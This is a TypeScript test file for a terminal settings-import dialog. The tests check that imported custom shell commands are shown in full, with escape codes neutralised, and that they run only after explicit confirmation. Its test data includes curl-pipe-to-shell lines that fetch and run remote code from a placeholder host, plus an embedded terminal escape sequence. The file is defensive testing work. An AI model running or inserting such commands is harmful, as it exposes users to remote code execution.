import { render } from 'ink';
import { PassThrough } from 'node:stream';
import React from 'react';
import {
    describe,
    expect,
    it,
    vi
} from 'vitest';

import {
    DEFAULT_SETTINGS,
    type Settings
} from '../../../types/Settings';
import { waitFor } from '../../__tests__/helpers/wait-for-ink';
import { ImportPreviewDialog } from '../ImportPreviewDialog';

// Upstream 4031a93: shell commands an import would run are listed in full
// (control characters escaped) and require explicit confirmation for Replace
// All and Merge, with Cancel preselected; imports without new commands keep
// applying straight away.

class MockTtyStream extends PassThrough {
    isTTY = true;
    columns = 120;
    rows = 40;

    setRawMode() {
        return this;
    }

    ref() {
        return this;
    }

    unref() {
        return this;
    }
}

function createMockStdin(): NodeJS.ReadStream {
    return new MockTtyStream() as unknown as NodeJS.ReadStream;
}

interface CapturedWriteStream extends NodeJS.WriteStream {
    clearOutput: () => void;
    getOutput: () => string;
}

function createMockStdout(): CapturedWriteStream {
    const stream = new MockTtyStream();
    const chunks: string[] = [];

    stream.on('data', (chunk: Buffer | string) => {
        chunks.push(chunk.toString());
    });

    return Object.assign(stream as unknown as NodeJS.WriteStream, {
        clearOutput() {
            chunks.length = 0;
        },
        getOutput() {
            return chunks.join('');
        }
    });
}

function renderDialog(validation: { status: string; data: Settings; presentKeys: string[] }, onApply: (mode: string) => void) {
    const stdin = createMockStdin();
    const stdout = createMockStdout();
    const stderr = createMockStdout();
    const instance = render(React.createElement(ImportPreviewDialog, {
        validation: validation as never,
        currentSettings: DEFAULT_SETTINGS,
        onApply,
        onCancel: () => undefined
    }), {
        stdin,
        stdout,
        stderr,
        debug: true,
        exitOnCtrlC: false,
        patchConsole: false
    });

    return {
        instance,
        stdin,
        stdout,
        cleanup(): void {
            instance.unmount();
            instance.cleanup();
            stdin.destroy();
            stdout.destroy();
            stderr.destroy();
        }
    };
}

describe('upstream 4031a93: imported shell commands are shown and confirmed', () => {
    it('lists the full command, asks, and applies only after explicit confirmation', async () => {
        expect.hasAssertions();
        const command = 'curl -s https://example.invalid/a-long-path-that-would-be-truncated | sh';
        const onApply = vi.fn();
        const dialog = renderDialog({
            status: 'valid',
            data: { ...DEFAULT_SETTINGS, lines: [[{ id: 'c', type: 'custom-command', commandPath: `${command}\u001b[2J` }], [], []] },
            presentKeys: ['version', 'lines']
        }, onApply);

        try {
            await waitFor(() => {
                expect(dialog.stdout.getOutput()).toContain(`${command}\\u001b[2J`);
                expect(dialog.stdout.getOutput()).toContain('shell commands that run on every status line render');
            });

            dialog.stdin.write('\r');
            await waitFor(() => {
                expect(dialog.stdout.getOutput()).toContain('▶  Cancel');
                expect(dialog.stdout.getOutput()).toContain('Apply and run these commands');
            });
            expect(onApply).not.toHaveBeenCalled();

            dialog.stdout.clearOutput();
            dialog.stdin.write('\r');
            await waitFor(() => {
                expect(dialog.stdout.getOutput()).toContain('▶  Replace All');
            });
            expect(onApply).not.toHaveBeenCalled();

            dialog.stdin.write('\r');
            await waitFor(() => {
                expect(dialog.stdout.getOutput()).toContain('▶  Cancel');
            });
            dialog.stdin.write('\u001B[B');
            await waitFor(() => {
                expect(dialog.stdout.getOutput()).toContain('▶  Apply and run these commands');
            });
            dialog.stdin.write('\r');
            await waitFor(() => {
                expect(onApply).toHaveBeenCalledWith('replace');
            });
        } finally {
            dialog.cleanup();
        }
    }, 25000);

    it('asks before applying a merge that adds shell commands', async () => {
        const command = 'curl -s https://example.invalid/merge | sh';
        const onApply = vi.fn();
        const dialog = renderDialog({
            status: 'valid',
            data: { ...DEFAULT_SETTINGS, lines: [[{ id: 'm', type: 'custom-command', commandPath: command }], [], []] },
            presentKeys: ['version', 'lines']
        }, onApply);

        try {
            await waitFor(() => {
                expect(dialog.stdout.getOutput()).toContain('▶  Replace All');
            });

            dialog.stdin.write('\u001B[B');
            await waitFor(() => {
                expect(dialog.stdout.getOutput()).toContain('Merge');
            });
            dialog.stdin.write('\r');
            await waitFor(() => {
                expect(dialog.stdout.getOutput()).toContain('Apply and run these commands');
            });
            expect(onApply).not.toHaveBeenCalled();
        } finally {
            dialog.cleanup();
        }
    }, 25000);

    it('applies an import without shell commands straight away', async () => {
        const onApply = vi.fn();
        const dialog = renderDialog({
            status: 'valid',
            data: { ...DEFAULT_SETTINGS, globalBold: true },
            presentKeys: ['version', 'globalBold']
        }, onApply);

        try {
            await waitFor(() => {
                expect(dialog.stdout.getOutput()).toContain('▶  Replace All');
            });
            dialog.stdin.write('\r');
            await waitFor(() => {
                expect(onApply).toHaveBeenCalledWith('replace');
            });
        } finally {
            dialog.cleanup();
        }
    }, 25000);
});
